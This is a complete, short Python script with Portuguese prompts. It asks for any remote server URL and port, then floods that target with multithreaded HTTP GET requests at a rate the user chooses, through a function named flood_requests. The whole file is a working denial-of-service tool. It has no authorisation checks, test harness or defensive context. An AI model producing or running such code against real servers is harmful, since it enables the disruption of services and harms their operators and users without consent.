import requests
import time
import threading

def send_get_request(url, port):
    try:
        response = requests.get(f"{url}:{port}")
        if response.status_code == 200:
            print("Solicitação bem-sucedida!")
        else:
            print(f"Erro na solicitação: código de status {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Erro na solicitação: {e}")

def flood_requests(url, port, num_requests, requests_per_second):
    interval = 1 / requests_per_second

    for i in range(num_requests):
        send_get_request(url, port)
        time.sleep(interval)

def main():
    url = input("Digite o URL do servidor remoto: ")
    port = input("Digite a porta específica: ")
    num_requests = int(input("Quantas solicitações você deseja enviar? "))
    requests_per_second = int(input("Quantas solicitações por segundo você deseja fazer? "))
    num_threads = int(input("Quantas threads você deseja usar para enviar solicitações? "))

    requests_per_thread = num_requests // num_threads

    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=flood_requests, args=(url, port, requests_per_thread, requests_per_second))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
